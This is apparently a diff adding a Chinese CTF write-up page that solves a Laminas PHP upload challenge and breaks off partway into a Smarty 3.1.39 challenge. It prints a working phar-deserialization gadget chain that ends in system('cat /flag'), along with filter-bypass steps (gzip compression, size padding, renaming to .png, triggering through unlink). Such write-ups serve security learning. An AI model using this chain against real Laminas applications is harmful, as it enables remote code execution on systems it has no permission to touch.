+        <span class="nv">$form</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">UploadForm</span><span class="p">(</span><span class="s1">&#39;upload-form&#39;</span><span class="p">);</span>
+
+        <span class="nv">$request</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getRequest</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">isPost</span><span class="p">())</span> <span class="p">{</span>
+            <span class="c1">// Make certain to merge the $_FILES info!
+</span><span class="c1"></span>            <span class="nv">$post</span> <span class="o">=</span> <span class="nx">array_merge_recursive</span><span class="p">(</span>
+                <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">getPost</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">(),</span>
+                <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">getFiles</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">()</span>
+            <span class="p">);</span>
+
+            <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">setData</span><span class="p">(</span><span class="nv">$post</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$form</span><span class="o">-&gt;</span><span class="na">isValid</span><span class="p">())</span> <span class="p">{</span>
+                <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">getData</span><span class="p">();</span>
+                <span class="nv">$base</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s2">&#34;image-file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">],</span><span class="o">-</span><span class="mi">4</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
+                <span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">white_list</span><span class="p">)){</span>   <span class="c1">//白名单限制
+</span><span class="c1"></span>                    <span class="nv">$cont</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s2">&#34;image-file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">]);</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/&lt;\?|php|HALT\_COMPILER/i&#34;</span><span class="p">,</span> <span class="nv">$cont</span> <span class="p">))</span> <span class="p">{</span>
+                        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Not This&#34;</span><span class="p">);</span>
+                    <span class="p">}</span>
+                    <span class="k">if</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s2">&#34;image-file&#34;</span><span class="p">][</span><span class="s2">&#34;size&#34;</span><span class="p">]</span><span class="o">&lt;</span><span class="mi">3000</span><span class="p">){</span>
+                        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;The picture size must be more than 3kb&#34;</span><span class="p">);</span>
+                    <span class="p">}</span>
+                    <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">realpath</span><span class="p">(</span><span class="nx">getcwd</span><span class="p">())</span><span class="o">.</span><span class="s1">&#39;/public/img/&#39;</span><span class="o">.</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s2">&#34;image-file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">])</span><span class="o">.</span><span class="nv">$base</span><span class="p">;</span>
+                    <span class="k">echo</span> <span class="nv">$img_path</span><span class="p">;</span>
+                    <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">saveImg</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s2">&#34;image-file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span><span class="nv">$img_path</span><span class="p">);</span>
+                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+                    <span class="k">echo</span> <span class="s1">&#39;Only Img Can Be Uploaded!&#39;</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="c1">// Form is valid, save the form!
+</span><span class="c1"></span>                <span class="c1">//return $this-&gt;redirect()-&gt;toRoute(&#39;upload-form/success&#39;);
+</span><span class="c1"></span>            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="p">[</span><span class="s1">&#39;form&#39;</span> <span class="o">=&gt;</span> <span class="nv">$form</span><span class="p">];</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>首先是很明显是一个文件上传</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">imguploadAction</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$form</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">UploadForm</span><span class="p">(</span><span class="s1">&#39;upload-form&#39;</span><span class="p">);</span>
+
+        <span class="nv">$request</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getRequest</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">isPost</span><span class="p">())</span> <span class="p">{</span>
+            <span class="c1">// Make certain to merge the $_FILES info!
+</span><span class="c1"></span>            <span class="nv">$post</span> <span class="o">=</span> <span class="nx">array_merge_recursive</span><span class="p">(</span>
+                <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">getPost</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">(),</span>
+                <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">getFiles</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">()</span>
+            <span class="p">);</span>
+
+            <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">setData</span><span class="p">(</span><span class="nv">$post</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$form</span><span class="o">-&gt;</span><span class="na">isValid</span><span class="p">())</span> <span class="p">{</span>
+                <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">getData</span><span class="p">();</span>
+                <span class="nv">$base</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s2">&#34;image-file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">],</span><span class="o">-</span><span class="mi">4</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
+                <span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">white_list</span><span class="p">)){</span>   <span class="c1">//白名单限制
+</span><span class="c1"></span>                    <span class="nv">$cont</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s2">&#34;image-file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">]);</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/&lt;\?|php|HALT\_COMPILER/i&#34;</span><span class="p">,</span> <span class="nv">$cont</span> <span class="p">))</span> <span class="p">{</span>
+                        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Not This&#34;</span><span class="p">);</span>
+                    <span class="p">}</span>
+                    <span class="k">if</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s2">&#34;image-file&#34;</span><span class="p">][</span><span class="s2">&#34;size&#34;</span><span class="p">]</span><span class="o">&lt;</span><span class="mi">3000</span><span class="p">){</span>
+                        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;The picture size must be more than 3kb&#34;</span><span class="p">);</span>
+                    <span class="p">}</span>
+                    <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">realpath</span><span class="p">(</span><span class="nx">getcwd</span><span class="p">())</span><span class="o">.</span><span class="s1">&#39;/public/img/&#39;</span><span class="o">.</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s2">&#34;image-file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">])</span><span class="o">.</span><span class="nv">$base</span><span class="p">;</span>
+                    <span class="k">echo</span> <span class="nv">$img_path</span><span class="p">;</span>
+                    <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">saveImg</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s2">&#34;image-file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span><span class="nv">$img_path</span><span class="p">);</span>
+                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+                    <span class="k">echo</span> <span class="s1">&#39;Only Img Can Be Uploaded!&#39;</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="c1">// Form is valid, save the form!
+</span><span class="c1"></span>                <span class="c1">//return $this-&gt;redirect()-&gt;toRoute(&#39;upload-form/success&#39;);
+</span><span class="c1"></span>            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="p">[</span><span class="s1">&#39;form&#39;</span> <span class="o">=&gt;</span> <span class="nv">$form</span><span class="p">];</span>
+    <span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>首先有一个白名单限制，只能传图片后缀，再者这里有一个phar文件的识别
+这里就属于此地无银三百两了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="p">(</span><span class="s2">&#34;/&lt;\?|php|HALT\_COMPILER/i&#34;</span><span class="p">,</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>找phar的利用点，在imgdeleteAction里面有<code>@unlink($imgpath);</code>，可以触发phar</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">imgdeleteAction</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="nv">$request</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getRequest</span><span class="p">();</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">getPost</span><span class="p">()[</span><span class="s1">&#39;imgpath&#39;</span><span class="p">])){</span>
+        <span class="nv">$imgpath</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">getPost</span><span class="p">()[</span><span class="s1">&#39;imgpath&#39;</span><span class="p">];</span>
+        <span class="nv">$base</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$imgpath</span><span class="p">,</span><span class="o">-</span><span class="mi">4</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">white_list</span><span class="p">)){</span>     <span class="c1">//白名单
+</span><span class="c1"></span>            <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$imgpath</span><span class="p">);</span>
+        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+            <span class="k">echo</span> <span class="s1">&#39;Only Img File Can Be Deleted!&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>那么就好做了，首先去找链子
+如下链子可以rce，直接构造phar文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+
+<span class="k">namespace</span> <span class="nx">Laminas\View\Resolver</span><span class="p">{</span>
+	<span class="k">class</span> <span class="nc">TemplateMapResolver</span><span class="p">{</span>
+		<span class="k">protected</span> <span class="nv">$map</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;setBody&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;system&#34;</span><span class="p">];</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+<span class="k">namespace</span> <span class="nx">Laminas\View\Renderer</span><span class="p">{</span>
+	<span class="k">class</span> <span class="nc">PhpRenderer</span><span class="p">{</span>
+		<span class="k">private</span> <span class="nv">$__helpers</span><span class="p">;</span>
+		<span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">__helpers</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Laminas\View\Resolver\TemplateMapResolver</span><span class="p">();</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+
+<span class="k">namespace</span> <span class="nx">Laminas\Log\Writer</span><span class="p">{</span>
+	<span class="k">abstract</span> <span class="k">class</span> <span class="nc">AbstractWriter</span><span class="p">{}</span>
+	
+	<span class="k">class</span> <span class="nc">Mail</span> <span class="k">extends</span> <span class="nx">AbstractWriter</span><span class="p">{</span>
+		<span class="k">protected</span> <span class="nv">$eventsToMail</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;cat /flag&#34;</span><span class="p">];</span>
+		<span class="k">protected</span> <span class="nv">$subjectPrependText</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+		<span class="k">protected</span> <span class="nv">$mail</span><span class="p">;</span>
+		<span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mail</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Laminas\View\Renderer\PhpRenderer</span><span class="p">();</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">namespace</span> <span class="nx">Laminas\Log</span><span class="p">{</span>
+	<span class="k">class</span> <span class="nc">Logger</span><span class="p">{</span>
+		<span class="k">protected</span> <span class="nv">$writers</span><span class="p">;</span>
+		<span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">writers</span> <span class="o">=</span> <span class="p">[</span><span class="k">new</span> <span class="nx">\Laminas\Log\Writer\Mail</span><span class="p">()];</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">namespace</span><span class="p">{</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Laminas\Log\Logger</span><span class="p">();</span>
+<span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
+<span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span> 
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class="p">);</span> 
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span> 
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span> 
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>由于他会对phar文件的特征进行识别，所以我们需要加以绕过，<a href="https://www.freebuf.com/articles/web/291992.html" target="_blank" rel="noopener noreffer">这里</a>
+有两个绕过方法，我直接把phar文件进行gzip压缩，这样就没有特征了</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/9278ffc1187f4ded8db45e56c4d1b661.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/9278ffc1187f4ded8db45e56c4d1b661.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/9278ffc1187f4ded8db45e56c4d1b661.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/9278ffc1187f4ded8db45e56c4d1b661.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/9278ffc1187f4ded8db45e56c4d1b661.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" /></p>
+<p>然后修改后缀为png，在/album/imgupload里上传上去</p>
+<p>他说文件太小，必须要大于3kb</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s2">&#34;image-file&#34;</span><span class="p">][</span><span class="s2">&#34;size&#34;</span><span class="p">]</span><span class="o">&lt;</span><span class="mi">3000</span><span class="p">){</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;The picture size must be more than 3kb&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>那么就直接在后面加数据就可以了</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/5d6389c47da648958bc2674a5bb65e55.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_19,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/5d6389c47da648958bc2674a5bb65e55.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_19%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/5d6389c47da648958bc2674a5bb65e55.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_19%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/5d6389c47da648958bc2674a5bb65e55.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_19%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/5d6389c47da648958bc2674a5bb65e55.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_19,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" /></p>
+<p>然后上传上去，返回图片的路径</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/9375049d10694def9ef31341709b42bd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/9375049d10694def9ef31341709b42bd.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/9375049d10694def9ef31341709b42bd.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/9375049d10694def9ef31341709b42bd.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/9375049d10694def9ef31341709b42bd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" /></p>
+<p>在到/album/imgdelete里面用unlink去触发phar</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/b56d2a0314764ea2820a113a5f4a3370.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/b56d2a0314764ea2820a113a5f4a3370.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/b56d2a0314764ea2820a113a5f4a3370.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/b56d2a0314764ea2820a113a5f4a3370.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/b56d2a0314764ea2820a113a5f4a3370.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" /></p>
+<p>成功拿到flag</p>
+<h2 id="smarty-calculator">Smarty calculator</h2>
+<p>也是开局有一个www.zip的源码泄露，是Smarty模板引擎，看了一下版本是3.1.39</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/a94f391f7a7546f7b21600a82473403e.png"
+        data-srcset="https://img-blog.csdnimg.cn/a94f391f7a7546f7b21600a82473403e.png, https://img-blog.csdnimg.cn/a94f391f7a7546f7b21600a82473403e.png 1.5x, https://img-blog.csdnimg.cn/a94f391f7a7546f7b21600a82473403e.png 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/a94f391f7a7546f7b21600a82473403e.png"
+        title="在这里插入图片描述" /></p>
+<p>那么他说自己修改了这个模板，那么我们下载到源文件去比较一下</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/e158d7bd4f6449658a1a999a8b2615ad.png"
+        data-srcset="https://img-blog.csdnimg.cn/e158d7bd4f6449658a1a999a8b2615ad.png, https://img-blog.csdnimg.cn/e158d7bd4f6449658a1a999a8b2615ad.png 1.5x, https://img-blog.csdnimg.cn/e158d7bd4f6449658a1a999a8b2615ad.png 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/e158d7bd4f6449658a1a999a8b2615ad.png"
+        title="在这里插入图片描述" /></p>
+<p>重点在这个文件：smarty_internal_compile_function.php
+他修改了正则过滤</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/3bac3ec643eb4cdfa1e9f64561a4f43f.png"
+        data-srcset="https://img-blog.csdnimg.cn/3bac3ec643eb4cdfa1e9f64561a4f43f.png, https://img-blog.csdnimg.cn/3bac3ec643eb4cdfa1e9f64561a4f43f.png 1.5x, https://img-blog.csdnimg.cn/3bac3ec643eb4cdfa1e9f64561a4f43f.png 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/3bac3ec643eb4cdfa1e9f64561a4f43f.png"
+        title="在这里插入图片描述" /></p>
+<p>再看漏洞，网上搜了一轮，在3.1.38有一个代码注入漏洞，CVE-2021-26119和CVE-2021-26120国外有师傅分析过这个<a href="https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html" target="_blank" rel="noopener noreffer">漏洞</a>
+</p>
+<p>很明显我们应该就是得走这个方向
+我对比了一下38和39的文件的修改，他的修改就是在这个文件里增加了一个正则过滤</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/c4b101e50064480a99cb294fd1d199ee.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
